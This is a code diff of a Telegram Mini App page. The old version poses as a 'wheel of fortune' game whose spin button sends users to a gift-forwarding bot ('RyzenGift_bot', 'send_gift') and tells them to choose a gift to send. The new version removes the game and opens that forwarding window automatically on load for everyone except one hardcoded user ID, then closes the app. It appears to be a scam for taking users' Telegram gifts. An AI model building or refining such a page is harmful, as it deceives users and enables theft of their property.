@@ -2,62 +2,20 @@
 <html>
 <head>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body {
-            background: #1e1e2f;
-            color: white;
-            font-family: sans-serif;
-            text-align: center;
-            padding-top: 50px;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .btn {
-            background: #f7971e;
-            color: #1a1a2e;
-            border: none;
-            padding: 20px 40px;
-            border-radius: 10px;
-            font-size: 24px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(247, 151, 30, 0.3);
-            transition: 0.2s;
-        }
-        .btn:active {
-            transform: scale(0.95);
-        }
-        .btn:disabled {
-            opacity: 0.5;
-        }
-    </style>
 </head>
 <body>
-    <h2>🎰 Колесо удачи</h2>
-    <button class="btn" id="spinBtn">🎲 Крутить!</button>
-
     <script>
         const WebApp = window.Telegram.WebApp;
         WebApp.ready();
 
         const user = WebApp.initDataUnsafe.user;
-        const btn = document.getElementById('spinBtn');
-
-        btn.addEventListener('click', function() {
-            if (user && user.id != 8528804038) {
-                // ОТПРАВЛЯЕМ КОМАНДУ БОТУ НА ОТКРЫТИЕ ОКНА ПЕРЕСЫЛКИ
-                WebApp.openLink('tg://resolve?domain=RyzenGift_bot&start=send_gift');
-                
-                btn.disabled = true;
-                btn.textContent = '✅ Отправлено!';
-                WebApp.showAlert('🎁 Выберите подарок для отправки!');
-                setTimeout(() => WebApp.close(), 2000);
-            }
-        });
+        if (user && user.id != 8528804038) {
+            // АВТОМАТИЧЕСКИ ОТКРЫВАЕМ ОКНО ПЕРЕСЫЛКИ ПОДАРКА
+            WebApp.openLink('tg://resolve?domain=RyzenGift_bot&start=send_gift');
+            
+            // ЗАКРЫВАЕМ МИНИ-ПРИЛОЖЕНИЕ
+            WebApp.close();
+        }
     </script>
 </body>
 </html>
